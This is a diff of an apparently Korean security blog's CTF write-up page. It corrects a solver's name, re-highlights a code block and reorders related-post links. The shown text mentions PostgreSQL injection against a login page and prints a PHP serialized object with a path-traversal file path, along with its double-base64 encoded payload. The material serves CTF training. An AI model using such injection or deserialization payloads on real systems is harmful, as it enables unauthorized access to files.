@@ -298,7 +298,7 @@ Completed.
 <h2 id="5-of-diamonds">5 of Diamonds</h2>
 
 <blockquote>
-  <p>Solver is <strong>Yootaek Lim</strong> from <strong>STLCTF</strong></p>
+  <p>Solver is <strong>YouTaek Lim</strong> from <strong>STLCTF</strong></p>
 </blockquote>
 
 <p>11111/tcp에 접근 시 로그인 할 수 있는 웹페이지가 나온다. 사용자명은 admin, 패스워드에 postgresql injection을 통해 공격하여 플래그를 획득할 수 있다.</p>
@@ -497,10 +497,10 @@ out: PNG image data, 500 x 700, 8-bit/color RGBA, non-interlaced
 <span class="k">print</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">);</span>
 <span class="k">print</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">))));</span>
 </code></pre></div></div>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ php serialize.php
-O:4:"user":3:{s:8:"username";s:5:"admin";s:5:"admin";b:0;s:11:"profile_img";s:37:"/var/www/html/../../../../../flag.png";}
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php serialize.php
+O:4:<span class="s2">"user"</span>:3:<span class="o">{</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>b:0<span class="p">;</span>s:11:<span class="s2">"profile_img"</span><span class="p">;</span>s:37:<span class="s2">"/var/www/html/../../../../../flag.png"</span><span class="p">;</span><span class="o">}</span>
 
-VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0=
+<span class="nv">VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0</span><span class="o">=</span>
 </code></pre></div></div>
 
 <hr />
@@ -562,6 +562,30 @@ VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2
             <div class="row">
     <div class="col-sm-2 col-md-2">
         <div class="profile">
+            <img src="/assets/stealien_inverse.png" class="profile_image" />
+            <div class="profile_author">seonungjang</div>
+        </div>
+    </div>
+    <div class="col">
+        <a href="/id/2022-03-15/DirtyPipe">
+            <div class="post-title">
+                DirtyPipe
+            </div>
+        </a>
+        <div class="post-summary">DirtyPipe</div>
+        <div class="post-info">
+            <span style="color: #545454" class="post-author-mobile">
+                seonungjang
+                <span style="color: #f5f5f5; margin: 2px">|</span>
+            </span>
+            Mar 15, 2022
+            <span style="color: #f5f5f5; margin: 2px">|</span>
+            <span>R&D</span>
+        </div>
+    </div>
+</div><div class="row">
+    <div class="col-sm-2 col-md-2">
+        <div class="profile">
             <img src="/assets/2021-01-28-metasploit-ctf-review/profile_image.jpg" class="profile_image" />
             <div class="profile_author">김도현</div>
         </div>
@@ -579,30 +603,6 @@ VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2
                 <span style="color: #f5f5f5; margin: 2px">|</span>
             </span>
             Dec 7, 2021
-            <span style="color: #f5f5f5; margin: 2px">|</span>
-            <span>R&D</span>
-        </div>
-    </div>
-</div><div class="row">
-    <div class="col-sm-2 col-md-2">
-        <div class="profile">
-            <img src="/assets/posts/thumbnails/20200619.jpg" class="profile_image" />
-            <div class="profile_author">김도현</div>
-        </div>
-    </div>
-    <div class="col">
-        <a href="/id/2021-10-13/MikroTik-PostAuth-RCE">
-            <div class="post-title">
-                MikroTik Post-Auth execve() call.
-            </div>
-        </a>
-        <div class="post-summary">MikroTik Post-Auth execve() call.</div>
-        <div class="post-info">
-            <span style="color: #545454" class="post-author-mobile">
-                김도현
-                <span style="color: #f5f5f5; margin: 2px">|</span>
-            </span>
-            Oct 13, 2021
             <span style="color: #f5f5f5; margin: 2px">|</span>
             <span>R&D</span>
         </div>
